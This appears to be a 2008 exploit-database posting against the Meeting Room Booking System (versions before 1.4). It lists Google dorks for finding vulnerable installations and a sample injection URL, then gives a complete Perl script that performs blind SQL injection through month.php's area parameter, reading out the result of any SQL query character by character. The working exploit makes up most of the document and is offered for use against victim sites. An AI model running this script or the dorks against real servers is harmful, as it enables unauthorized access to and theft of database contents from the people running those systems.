# "MRBS is a system for multi-site booking of meeting rooms. Rooms are grouped by building/area and shown in a side-by-side view. Although the goal was initially to book rooms, MRBS can also be used to book any resource (computer, planes, whatever you want)".

# Web CMS: http://sourceforge.net/projects/mrbs/
# Affected: Previous versions of mrbs 1.4
# Solution: Update to Version 1.4

# Doorks:
# "Meeting Room Booking System" "month.php?area="
# "Meeting Room Booking System" "day.php?area="
# "Meeting Room Booking System" "week.php?area="

# Author: Xianur0
# Try: http://www.sitio.com/path/month.php?area=1/**/and/**/1=0

# Exploit:

#!/usr/bin/perl

#Xianur0 CYS # perl blind.pl http://www.victima/st/schedule/ 'SELECT user()'
#
#Exploit MRBS By Xianur0
#
#Please Have Patience, The Blind SQL Injection is running.........
#pma@localhost
#
#
#Finished!
#


# By Xianur0

  use LWP::UserAgent;

%ascii = ("32", " ","32", " ","33", "!","34", '"',"35", "#","36", '$',"37", "%","38", "&","39", "'","40", "(","41", ")","42", "*","43", "+","44", ",","45", "-","46", ".","47", "/","48", "0","49", "1","50", "2","51", "3","52", "4","53", "5","54", "6","55", "7","56", "8","57", "9","58", ":","59", ";","60", "<","61", "+","62", ">","63", "?","64", '@',"65","A","66","B","67","C","68","D","69","E","70","F","71","G","72","H","73","I","74","J","75","K","76","L","77","M","78","N","79","O","80","P","81","Q","82","R","83","S","84","T","85","U","86","V","87","W","88","X","89","Y","90","Z","95","_","97", "a", "98", "b", "99", "c", "100", ,"d","101","e", "102", "f", "103","g", "104", "h", "105","i", "106", "j", "107","k", "108", "l", "109","m", "110", "n", "111","o", "112", "p", "113","q", "114", "r", "115","s", "116", "t", "117","u", "118", "v", "119","w", "120", "x", "121","y", "122", "z");

  $ua = LWP::UserAgent->new;
  $ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17");
$url = $ARGV[0];
$sql = $ARGV[1] || die("Use: blind.pl [Complete URL] [SQL Injection]\nExample: blind.pl http://www.victima.com/mrbs/ 'SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES'\n");
print "\nExploit MRBS By Xianur0 \n\nPlease Have Patience, The Blind SQL Injection is running.........\n";
$caracter = 1;
$i=0;
$detector = '<h1>No rooms defined for this area</h1>';
$simbolo = ">";
while($caracter ne "finito") {
  $req = HTTP::Request->new(GET => $url.'/month.php?year=2008&month=08&area=1%20AND ascii(substring(('.$sql.'),'.$caracter.',1)) '.$simbolo.' '.$i);
  $req->header('Accept' => 'text/html');
  $res = $ua->request($req);
  if ($res->is_success) {
     if($res->content !~ $detector) {
if($base eq $i) { print "$ascii{$i}"; $caracter++; $i=0; $simbolo = ">";}
$base = $i;
$i = $i+10;
} else { if($i eq 0) { print "\nError Performing Blind (Less Value to 0)!\n"; $caracter = "finito";} else {$i = $i-1; $simbolo = "=";}
}
  } else {
     print "\nError detected in HTTP requests: " . $res->status_line . "!\n";
  }
}

print "\nFinished!\n";

# milw0rm.com [2008-10-18]
